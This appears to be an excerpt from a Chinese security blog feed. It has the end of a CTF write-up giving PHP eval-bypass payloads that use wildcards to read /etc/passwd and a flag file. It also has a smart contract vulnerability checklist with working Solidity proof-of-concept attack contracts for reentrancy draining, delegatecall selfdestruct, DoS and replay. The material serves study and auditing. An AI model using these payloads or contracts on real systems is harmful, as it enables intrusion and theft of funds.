`ls`<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>执行结果</p><p><img src="/ctf-2018安恒9月赛babybypass复现-无字母数字的webshell思考/1538795891202.png" alt="1538795891202"></p><p>可以看到，<code>&lt;?= ?&gt;</code>是php的短标签，效果等同于:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">echo</span> `ls` <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>那么在eval中怎么用这个短标签呢？答案是先使用tag（<code>?&gt;</code>）离开当前模式，再使用短标签，即<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">接下来就是怎么绕过正则了，bash里面用通配符绕过就好了，即</span><br><span class="line"></span><br><span class="line">```bash</span><br><span class="line">cat /etc/passwd #替换为</span><br><span class="line">/???/??t /??c/p???w?</span><br></pre></td></tr></table></figure></p><p>因此paylaod为<code>code=?&gt;&lt;?=`/???/??? /???/???/????/*`;?&gt;</code> (<code>code=?&gt;&lt;?=` /bin/cat /var/www/html/*`;?&gt;)</code>, 会发现php代码里面的源代码getflag那一部分的函数是是从/flag里面读取的，那么构造<code>code=?&gt;&lt;?=`/???/??? /????`;?&gt;</code>相当于<code>code=?&gt;&lt;?=` /bin/cat /flag`;?&gt;</code>即可。</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PHP </tag>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>智能合约Checklist</title>
      <link href="/blockchain-%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6checklist/"/>
      <url>/blockchain-%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6checklist/</url>
      
        <content type="html"><![CDATA[<p><strong>本文首次发表在<a href="https://www.freebuf.com/vuls/183357.html" target="_blank" rel="noopener">Freebuf</a>上，本文只做归档用。</strong></p><h1 id="整形溢出-Arithmetic-Issues"><a href="#整形溢出-Arithmetic-Issues" class="headerlink" title="整形溢出(Arithmetic Issues)"></a>整形溢出(Arithmetic Issues)</h1><p>如下代码，如果没有assert判断，那么sellerBalance+value可能会超出uint上限制导致溢出。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^<span class="number">0.4</span><span class="number">.15</span>;</span><br><span class="line">contract Overflow &#123;</span><br><span class="line">    uint private sellerBalance=<span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">add</span>(<span class="params">uint value</span>) <span class="title">returns</span> (<span class="params">bool, uint</span>)</span>&#123;</span><br><span class="line">        sellerBalance += value; <span class="comment">// complicated math with possible overflow</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">// possible auditor assert</span></span><br><span class="line">        assert(sellerBalance &gt;= value);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><a id="more"></a><h1 id="危险的delegatecall-dangerous-delegatecall-contractfuzzer"><a href="#危险的delegatecall-dangerous-delegatecall-contractfuzzer" class="headerlink" title="危险的delegatecall(dangerous delegatecall)contractfuzzer"></a>危险的delegatecall(dangerous delegatecall)<sup><a href="#fn_contractfuzzer" id="reffn_contractfuzzer">contractfuzzer</a></sup></h1><p>首先需要了解call和delegatecall的区别：call和delegatecall都为合约相互调用时的函数，假设A调用B函数，call方法结果展示到B中，delegatecall方法结果展示到A中。</p><p>在如下示例中，Mark如果用delegatecall调用了恶意合约Steal，那么Mark合约会被删除。</p><p>复现：</p><ol><li>用A账户部署Steal，用B账户部署Mark合约，并在部署时为合约附加10个ether。</li><li>账户B调用Mark.call(address(Steal))，即用B调用Steal的Innocence方法，实际上innocence会在Mark的上下文环境运行，发现账户B收到合约的10 ether（<strong>注意不是A账户</strong>)</li><li>用C账户执行Mark.deposit()方法，并附加10ether，再调用destruct方法，发现B无法收到10ether，说明合约确实已经在第二步被销毁。</li></ol><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^<span class="number">0.4</span><span class="number">.2</span>;</span><br><span class="line">contract Steal&#123;</span><br><span class="line">    address owner;</span><br><span class="line">    <span class="keyword">constructor</span> () payable &#123;</span><br><span class="line">        owner = msg.sender;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">innocence</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        log0(<span class="string">"123"</span>);</span><br><span class="line">        selfdestruct(owner);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract Mark &#123;</span><br><span class="line">    address owner;</span><br><span class="line">    <span class="keyword">constructor</span> () payable &#123;</span><br><span class="line">        owner = msg.sender;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">Deposit</span>(<span class="params"></span>) <span class="title">payable</span> </span>&#123;&#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">call</span>(<span class="params">address a</span>) </span>&#123;</span><br><span class="line">        a.delegatecall(bytes4(keccak256(<span class="string">"innocence()"</span>)));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="无Gas发送-Gasless-Send-contractfuzzer"><a href="#无Gas发送-Gasless-Send-contractfuzzer" class="headerlink" title="无Gas发送(Gasless Send)contractfuzzer"></a>无Gas发送(Gasless Send)<sup><a href="#fn_contractfuzzer" id="reffn_contractfuzzer">contractfuzzer</a></sup></h1><p>合约C调用合约D1时，由于fallback函数修改了storage变量——这是一个消耗大量gas的操作——导致了超过fallback的gas上限(2300gas)导致fallback失败，调用D2时，由于没有超过上限，调用成功。</p><p>复现：</p><ol><li>用10ether部署C合约，0ether部署D1合约，0ether部署D2合约</li><li>调用C.pay(1000000000000000000, address(D1))，D1的count值仍为0。</li><li>调用D1.kill()，以太币不增加。2,3两步说明了D1的fallback调用失败</li><li>调用C.pay(1000000000000000000,address(D2))</li><li>调用D2.kill()，发现账户增加1ether，说明D2的fallback调用成功</li></ol><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^<span class="number">0.4</span><span class="number">.2</span>;</span><br><span class="line"></span><br><span class="line">contract C &#123;</span><br><span class="line">    address owner;</span><br><span class="line">    <span class="keyword">constructor</span> () payable&#123;</span><br><span class="line">        owner=msg.sender;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">pay</span>(<span class="params">uint n, address d</span>)</span>&#123;</span><br><span class="line">        d.send(n);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">kill</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">       <span class="keyword">if</span> (owner == msg.sender) &#123;</span><br><span class="line">          selfdestruct(owner);</span><br><span class="line">       &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract D1 &#123;</span><br><span class="line">    address owner;</span><br><span class="line">    uint public count = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">constructor</span> () payable&#123;</span><br><span class="line">        owner=msg.sender;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span>(<span class="params"></span>) <span class="title">payable</span> </span>&#123;</span><br><span class="line">        count = count+<span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">kill</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">       <span class="keyword">if</span> (owner == msg.sender) &#123;</span><br><span class="line">          selfdestruct(owner);</span><br><span class="line">       &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract D2  &#123;</span><br><span class="line">    address owner;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">constructor</span> () payable&#123;</span><br><span class="line">        owner=msg.sender;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span>(<span class="params"></span>) <span class="title">payable</span> </span>&#123;&#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">kill</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">       <span class="keyword">if</span> (owner == msg.sender) &#123;</span><br><span class="line">          selfdestruct(owner);</span><br><span class="line">       &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="依赖于交易顺序-条件竞争-TOD-Front-Running-smarter"><a href="#依赖于交易顺序-条件竞争-TOD-Front-Running-smarter" class="headerlink" title="依赖于交易顺序/条件竞争(TOD/Front Running)smarter"></a>依赖于交易顺序/条件竞争(TOD/Front Running)<sup><a href="#fn_smarter" id="reffn_smarter">smarter</a></sup></h1><p>由于：</p><ol><li>只有当交易被打包进区块时，他才是不可更改的</li><li>区块会优先打包gasprice更高的交易</li></ol><p>所以攻击者可以恶意操控交易顺序从而使合约对自己有利。如图，出题人和做题人同时发起合约，那么做题人得到的奖励因合约执行顺序不同而不同。</p><p><img src="/blockchain-智能合约checklist/1534317198703.png" alt="1534317198703"></p><p>再例如ERC20标准中的approve，整个流程是这样的：</p><ol><li>用户A授权用户B 100代币的额度</li><li>用户A觉得100代币的额度太高了，再次调用approve试图把额度改为50</li><li>用户B在待交易处（打包前）看到了这笔交易</li><li>用户B构造一笔提取100代币的交易，通过条件竞争将这笔交易打包到了修改额度之前，成功提取了100代币</li><li>用户B发起了第二次交易，提取50代币，用户B成功拥有了150代币</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">function approve(address _spender, uint256 _value) public returns (bool success)&#123;</span><br><span class="line">    allowance[msg.sender][_spender] = _value;</span><br><span class="line">    return true</span><br></pre></td></tr></table></figure><h1 id="依赖于时间戳-Timestamp-Dependence-Time-manipulation-contractfuzzer"><a href="#依赖于时间戳-Timestamp-Dependence-Time-manipulation-contractfuzzer" class="headerlink" title="依赖于时间戳(Timestamp Dependence/Time manipulation)contractfuzzer"></a>依赖于时间戳(Timestamp Dependence/Time manipulation)<sup><a href="#fn_contractfuzzer" id="reffn_contractfuzzer">contractfuzzer</a></sup></h1><p><img src="/blockchain-智能合约checklist/1534316701411.png" alt="1534316701411"></p><p>攻击者可以修改区块的时间戳±900s以此获益。</p><h1 id="依赖于区块号-BlockNumber-Dependency-contractfuzzer"><a href="#依赖于区块号-BlockNumber-Dependency-contractfuzzer" class="headerlink" title="依赖于区块号(BlockNumber Dependency)contractfuzzer"></a>依赖于区块号(BlockNumber Dependency)<sup><a href="#fn_contractfuzzer" id="reffn_contractfuzzer">contractfuzzer</a></sup></h1><p>和上面依赖时间戳类似</p><h1 id="ExceptionDisordercontractfuzzer"><a href="#ExceptionDisordercontractfuzzer" class="headerlink" title="ExceptionDisordercontractfuzzer"></a>ExceptionDisorder<sup><a href="#fn_contractfuzzer" id="reffn_contractfuzzer">contractfuzzer</a></sup></h1><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">withdraw</span>(<span class="params">uint256 _amount</span>) <span class="title">public</span> </span>&#123;</span><br><span class="line">    <span class="built_in">require</span>(balances[msg.sender] &gt;= _amount);</span><br><span class="line">    balances[msg.sender] -= _amount;</span><br><span class="line">    etherLeft -= _amount;</span><br><span class="line">    msg.sender.send(_amount);  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>上面给出的代码中使用 send() 函数进行转账，因为这里没有验证 send() 返回值，如果msg.sender 为合约账户 fallback() 调用失败，则 send() 返回false，最终导致账户余额减少了，钱却没有拿到。</p><h1 id="未处理的异常-Mishandled-Exceptions-Unchecked-Return-Values-For-Low-Level-Calls-smarter"><a href="#未处理的异常-Mishandled-Exceptions-Unchecked-Return-Values-For-Low-Level-Calls-smarter" class="headerlink" title="未处理的异常(Mishandled Exceptions/Unchecked Return Values For Low Level Calls)smarter"></a>未处理的异常(Mishandled Exceptions/Unchecked Return Values For Low Level Calls)<sup><a href="#fn_smarter" id="reffn_smarter">smarter</a></sup></h1><p>例如合约KoET，攻击者可以控制函数调用次数（EVM限制调用深度为1024），从而导致send函数调用失败，但是接下来的代码会继续执行，这样前一个国王就无法得到报酬(compensation)。<br><img src="/blockchain-智能合约checklist/1535892194599.png" alt="1535892194599"></p><p>Attacker：</p><p><img src="/blockchain-智能合约checklist/1535891836531.png" alt="1535891836531"></p><p><strong>复现失败，在Remix中运行递归会崩溃，在实际运行中由于Gas较高，无法交易（预算手续费大于30ether）。</strong></p><h1 id="重入漏洞-Reentrancy-DAO-seebug1"><a href="#重入漏洞-Reentrancy-DAO-seebug1" class="headerlink" title="重入漏洞(Reentrancy/DAO)seebug1"></a>重入漏洞(Reentrancy/DAO)<sup><a href="#fn_seebug1" id="reffn_seebug1">seebug1</a></sup></h1><p>Solidity 中 <code>&lt;address&gt;.transfer()</code>，<code>&lt;address&gt;.send()</code>和<code>&lt;address&gt;.gas().call.vale()()</code>都可以用于向某一地址发送 ether，他们的区别在于：</p><ol><li><code>&lt;address&gt;.transfer()</code><ul><li>当发送失败时会 throw; 回滚状态</li><li>只会传递 2300 Gas 供调用，防止重入（reentrancy）</li></ul></li><li><code>&lt;address&gt;.send()</code><ul><li>当发送失败时会返回 false 布尔值</li><li>只会传递 2300 Gas 供调用，防止重入（reentrancy）</li></ul></li><li><code>&lt;address&gt;.gas().call.value()()</code><ul><li>当发送失败时会返回 false 布尔值</li><li>传递所有可用 Gas 进行调用（可通过 gas(gas_value) 进行限制），不能有效防止重入（reentrancy）</li></ul></li></ol><p>当外部账户或其他合约向一个合约地址发送ether时，会执行该合约的fallback函数（当调用合约时没有匹配到函数，也会调用没有名字的fallback函数——The DAO）。且call.value()会将所有可用Gas给予外部调用（fallback函数），若在fallback函数中再调用withdraw函数，则会导致递归问题。攻击者可以部署一个恶意递归的合约将公共钱包这个合约账户里的Ether全部提出来。</p><p>复现：</p><ol><li>账户A部署IDMoney合约，账户B部署Attack合约</li><li>账户A调用IDMoney()方法，并附加10ether</li><li>账户B部署Attack合约，附加2ether</li><li>账户B调用Attack.setVictim()方法，设置victim变量为IDMoney合约地址</li><li>账户B调用Attack.step1()方法，设置amount=1000000000000000000，即合约Attack调用合约IDMoney.deposit()方法</li><li>账户B调用Attack.step2()方法，设置amount=500000000000000000</li><li>账户B调用Attack.stopAttack()方法，获得IDMoney的所有余额（包括A的存款，严格说是合约中除了500000000000000000wei的余额）</li></ol><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^<span class="number">0.4</span><span class="number">.19</span>;</span><br><span class="line"></span><br><span class="line">contract IDMoney&#123;</span><br><span class="line">    address _owner;</span><br><span class="line">    mapping (<span class="function"><span class="params">address</span> =&gt;</span> uint256) balances;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">IDMoney</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        _owner = msg.sender;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">deposit</span>(<span class="params"></span>) <span class="title">public</span> <span class="title">payable</span> </span>&#123;</span><br><span class="line">        balances[msg.sender] += msg.value;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">withdraw</span>(<span class="params">address to, uint256 amount</span>) <span class="title">public</span> <span class="title">payable</span> </span>&#123;</span><br><span class="line">        <span class="built_in">require</span>(balances[msg.sender] &gt;= amount);</span><br><span class="line">        <span class="built_in">require</span>(<span class="keyword">this</span>.balance &gt;= amount);</span><br><span class="line">        log0(bytes32(address(<span class="keyword">this</span>).balance/<span class="number">1e15</span>));</span><br><span class="line">        to.call.value(amount)();</span><br><span class="line">        balances[msg.sender] -= amount;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">balanceof</span>(<span class="params">address to</span>) <span class="title">constant</span> <span class="title">returns</span>(<span class="params">uint256</span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> balances[to];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract Attack &#123;</span><br><span class="line">    address owner;</span><br><span class="line">    address victim;</span><br><span class="line"></span><br><span class="line">    modifier ownerOnly &#123; <span class="built_in">require</span>(owner == msg.sender); _; &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">Attack</span>(<span class="params"></span>) <span class="title">payable</span> </span>&#123; owner = msg.sender; &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 设置已部署的 IDMoney 合约实例地址</span></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">setVictim</span>(<span class="params">address target</span>) <span class="title">ownerOnly</span> </span>&#123; victim = target; &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// deposit Ether to IDMoney deployed</span></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">step1</span>(<span class="params">uint256 amount</span>) <span class="title">ownerOnly</span> <span class="title">payable</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">this</span>.balance &gt; amount) &#123;</span><br><span class="line">            victim.call.value(amount)(bytes4(keccak256(<span class="string">"deposit()"</span>)));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// withdraw Ether from IDMoney deployed</span></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">step2</span>(<span class="params">uint256 amount</span>) <span class="title">ownerOnly</span> </span>&#123;</span><br><span class="line">        victim.call(bytes4(keccak256(<span class="string">"withdraw(address,uint256)"</span>)), <span class="keyword">this</span>, amount);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// selfdestruct, send all balance to owner</span></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">stopAttack</span>(<span class="params"></span>) <span class="title">ownerOnly</span> </span>&#123;</span><br><span class="line">        selfdestruct(owner);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">startAttack</span>(<span class="params">uint256 amount</span>) <span class="title">ownerOnly</span> </span>&#123;</span><br><span class="line">        step1(amount);</span><br><span class="line">        step2(amount / <span class="number">2</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> (<span class="params"></span>) <span class="title">payable</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (msg.sender == victim) &#123;</span><br><span class="line">            <span class="comment">// 再次尝试调用 IDMoney 的 withdraw 函数，递归转币</span></span><br><span class="line">            victim.call(bytes4(keccak256(<span class="string">"withdraw(address,uint256)"</span>)), <span class="keyword">this</span>, msg.value);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>注意到合约IDMoney.withdraw()方法已经存在检查账户余额的代码，但是却未能生效，原因是递归调用时没有执行到<code>balances[msg.sender] -= amount;</code>，因此调用时，账户的余额是不变的，而真正导致递归调用退出的是<code>require(this.balance &gt;= amount);</code>，这也是为何调用结束后合约还剩下amount数量的以太币的原因。有人会问，如果把这句话删掉呢？我本以为合约会报错，但是很遗憾，合约依然能够正常运行，并且合约中不再剩下任何以太币。</p><h1 id="DoS攻击DoS"><a href="#DoS攻击DoS" class="headerlink" title="DoS攻击DoS"></a>DoS攻击<sup><a href="#fn_DoS" id="reffn_DoS">DoS</a></sup></h1><p>频繁调用某些Op(EXTCODESIZE和SUICIDE)，这些Op花费的Gas小，但是需要大量资源（计算资源，I/O），以此造成DoS，对以太坊合约进行 DoS 攻击，可能导致 Ether 和 Gas 的大量消耗，更严重的是让原本的合约代码逻辑无法正常运行。</p><p>复现：</p><ol><li>账户A部署PresidentOfCountry合约设置_price为1e18（1ether）。</li><li>账户B调用PresidentOfCountry，并附加1ether，成为President，price=2ether</li><li>账户C部署Attack，调用start_attack(address(PresidentOfCountry))并附加2ether，账户C成为President。</li><li>账户B调用PresidentOfCountry，并附加4ether，由于B要成为president,，需要调用PresidentOfCountry合约的becomePresident()函数，该函数会通过 transfer() 把ETH退回给之前的president，即Attack合约地址，但是因为Attacker的回退函数revert()抛异常==&gt;transfer()抛异常==&gt;becomePresident()抛异常，故而账户B永远无法成为president了。</li></ol><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^<span class="number">0.4</span><span class="number">.10</span>;</span><br><span class="line"></span><br><span class="line">contract PresidentOfCountry &#123;</span><br><span class="line">    address public president;</span><br><span class="line">    uint256 public price;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">constructor</span>(uint256 _price) public payable &#123;</span><br><span class="line">        <span class="built_in">require</span>(_price &gt; <span class="number">0</span>);</span><br><span class="line">        price = _price;</span><br><span class="line">        president = msg.sender;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">becomePresident</span>(<span class="params"></span>) <span class="title">payable</span> </span>&#123;</span><br><span class="line">        assert(msg.value &gt;= price);  <span class="comment">// must pay the price to become president</span></span><br><span class="line">        president.transfer(price);   <span class="comment">// we pay the previous president</span></span><br><span class="line">        president = msg.sender;      <span class="comment">// we crown the new president</span></span><br><span class="line">        price = msg.value * <span class="number">2</span>;           <span class="comment">// we double the price to become president</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">contract Attack &#123;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123; revert(); &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">start_attack</span>(<span class="params">address _target</span>) <span class="title">payable</span> </span>&#123;</span><br><span class="line">        _target.call.value(msg.value)(bytes4(keccak256(<span class="string">"becomePresident()"</span>)));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="重放攻击blackhat2018"><a href="#重放攻击blackhat2018" class="headerlink" title="重放攻击blackhat2018"></a>重放攻击<sup><a href="#fn_blackhat2018" id="reffn_blackhat2018">blackhat2018</a></sup></h1><p>如果合约存在相同的代码，则攻击者可以使用合约A函数的参数调用合约B。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * 付款人要为收款人转账，但是付款人没有足够的ETH，因此找一个代理人，并支付一定的代币作为代理费</span></span><br><span class="line"><span class="comment"> * @param _from     付款人</span></span><br><span class="line"><span class="comment"> * @param _to       收款人</span></span><br><span class="line"><span class="comment"> * @param _value    金额</span></span><br><span class="line"><span class="comment"> * @param feeUgt    代理费</span></span><br><span class="line"><span class="comment"> * @param _v        sig[0:66] #由付款人签名，即付款人确认付钱</span></span><br><span class="line"><span class="comment"> * @param _r        sig[66:130]</span></span><br><span class="line"><span class="comment"> * @param _s        sig[130:132]</span></span><br><span class="line"><span class="comment"> * 如果其他合约同样包含TransferProxy函数，并且实现相似，那么攻击者可以在B合约上重放函数参数，B合约会执行成功</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">transferProxy</span>(<span class="params">address _from, address _to, uint256 _value, uint256 _feeUgt,</span></span></span><br><span class="line"><span class="function"><span class="params">    uint8 _v,bytes32 _r, bytes32 _s</span>) <span class="title">returns</span> (<span class="params">bool</span>)</span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(balances[_from] &lt; _feeUgt + _value) <span class="keyword">throw</span>;</span><br><span class="line"></span><br><span class="line">    uint256 nonce = nonces[_from];</span><br><span class="line">    bytes32 h = sha3(_from,_to,_value,_feeUgt,nonce);</span><br><span class="line">    <span class="comment">// ecrecover 验签函数</span></span><br><span class="line">    <span class="keyword">if</span>(_from != ecrecover(h,_v,_r,_s)) <span class="keyword">throw</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(balances[_to] + _value &lt; balances[_to]</span><br><span class="line">        || balances[msg.sender] + _feeUgt &lt; balances[msg.sender]) <span class="keyword">throw</span>;</span><br><span class="line">    balances[_to] += _value;</span><br><span class="line">    Transfer(_from, _to, _value);</span><br><span class="line"></span><br><span class="line">    balances[msg.sender] += _feeUgt;</span><br><span class="line">    Transfer(_from, msg.sender, _feeUgt);</span><br><span class="line"></span><br><span class="line">    balances[_from] -= _value + _feeUgt;</span><br><span class="line">    nonces[_from] = nonce + <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="变量覆盖varreplace"><a href="#变量覆盖varreplace" class="headerlink" 